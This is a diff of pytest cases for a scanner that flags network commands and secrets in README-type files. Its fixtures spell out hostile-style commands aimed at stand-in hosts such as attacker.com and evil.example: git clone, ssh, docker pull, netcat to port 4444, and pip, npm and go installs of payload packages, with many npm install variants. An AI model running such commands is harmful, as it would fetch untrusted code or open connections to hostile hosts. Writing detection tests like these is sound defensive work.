@@ -792,6 +792,12 @@ def test_text_scanner_documentation_command_prefixes_remain_actionable(tmp_path:
         "echo ready; pwsh -NoProfile is documented at https://docs.example.com/powershell.\n",
         "certutil -urlcache is documented at https://docs.example.com/certutil.\n",
         "The certutil -urlcache command is documented at https://docs.example.com/certutil.\n",
+        "The git clone command is documented at https://git-scm.com/docs/git-clone.\n",
+        "git clone https://attacker.com/repo.git is documented here.\n",
+        "The ssh client is documented at https://man.openbsd.org/ssh.\n",
+        "ssh attacker.com is documented here.\n",
+        "Docker pull documentation: https://docs.docker.com/reference/cli/docker/image/pull/.\n",
+        "docker pull attacker.com/model:latest is documented here.\n",
         "npm --registry is documented at https://docs.example.com/npm.\n",
         "The nc command uses attacker.com and port 4444.\n",
         "nc attacker.com 0\n",
@@ -871,7 +877,7 @@ def test_text_scanner_documentation_netcat_destinations_remain_actionable(
     command: str,
 ) -> None:
     text_path = tmp_path / "README.md"
-    text_path.write_text(f"{command} evil.example 4444\n", encoding="utf-8")
+    text_path.write_bytes(f"{command} evil.example 4444\r\n".encode())
 
     result = TextScanner().scan(str(text_path))
     aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
@@ -899,6 +905,47 @@ def test_text_scanner_documentation_netcat_prose_remains_informational(tmp_path:
 
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
     assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    ("content", "command_type", "destination"),
+    [
+        ("git clone https://evil.example/repo.git\n", "git_clone", "https://evil.example/repo.git"),
+        (
+            "git clone --depth 1 https://user:secret@evil.example/repo.git checkout\n",
+            "git_clone",
+            "https://evil.example/repo.git",
+        ),
+        ("git clone git@evil.example:owner/repo.git\n", "git_clone", "git@evil.example:owner/repo.git"),
+        ("ssh -vvv -p2222 user@evil.example\n", "ssh", "user@evil.example"),
+        (
+            "docker pull --platform linux/amd64 evil.example/model:latest\n",
+            "docker_pull",
+            "evil.example/model:latest",
+        ),
+    ],
+)
+def test_text_scanner_explicit_network_commands_remain_actionable(
+    tmp_path: Path,
+    content: str,
+    command_type: str,
+    destination: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_command"
+        and check.details.get("command_type") == command_type
+        and check.details.get("destination") == destination
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
 
 
 @pytest.mark.parametrize(
@@ -986,10 +1033,23 @@ def test_text_scanner_env_prefixed_download_prose_remains_informational(tmp_path
     [
         "pip install https://evil.example/payload.whl\n",
         "python -m pip install https://evil.example/pkg.tar.gz\n",
+        "python -I -m pip install https://evil.example/pkg.tar.gz\n",
+        "python -X dev -m pip install https://evil.example/pkg.tar.gz\n",
         "py -3.11 -m pip install https://evil.example/payload.whl\n",
         "sudo pip install https://evil.example/payload.whl\n",
         "uv pip install https://evil.example/payload.whl\n",
         "npm install https://evil.example/payload.tgz\n",
+        "npm add https://evil.example/payload.tgz\n",
+        "npm i https://evil.example/payload.tgz\n",
+        "npm in https://evil.example/payload.tgz\n",
+        "npm ins https://evil.example/payload.tgz\n",
+        "npm inst https://evil.example/payload.tgz\n",
+        "npm insta https://evil.example/payload.tgz\n",
+        "npm instal https://evil.example/payload.tgz\n",
+        "npm isnt https://evil.example/payload.tgz\n",
+        "npm isnta https://evil.example/payload.tgz\n",
+        "npm isntal https://evil.example/payload.tgz\n",
+        "npm isntall https://evil.example/payload.tgz\n",
         "npm --registry=https://evil.example/registry install payload\n",
         "npm --registry https://evil.example/registry install payload\n",
         "1. pip install https://evil.example/payload.whl\n",
@@ -1027,11 +1087,30 @@ def test_text_scanner_documentation_package_manager_prose_remains_informational(
     assert determine_exit_code(aggregate) == 0
 
 
+def test_text_scanner_go_install_domain_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("go install evil.example/tool@latest\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "domain_name"
+        and check.details.get("domain") == "evil.example"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 @pytest.mark.parametrize(
     "content",
     [
         "pip install is documented at https://pip.pypa.io/en/stable/\n",
+        "python -I -m pip install guide at https://pip.pypa.io/en/stable/\n",
         "npm install documentation is covered in https://docs.npmjs.com/\n",
+        "go install guide at https://go.dev/doc/\n",
     ],
 )
 def test_text_scanner_package_install_reference_urls_remain_informational(tmp_path: Path, content: str) -> None:
@@ -1545,6 +1624,8 @@ def test_text_scanner_documentation_placeholder_secrets_are_ignored(tmp_path: Pa
         "client_secret = YOUR_CLIENT_SECRET\n"
         "secret = <CLIENT_SECRET>\n"
         "client_secret = clientSecretValue\n"
+        "client_secret = clientsecretvalue\n"
+        "password = examplepassword\n"
         "secret = <clientSecretValue>\n",
         encoding="utf-8",
     )
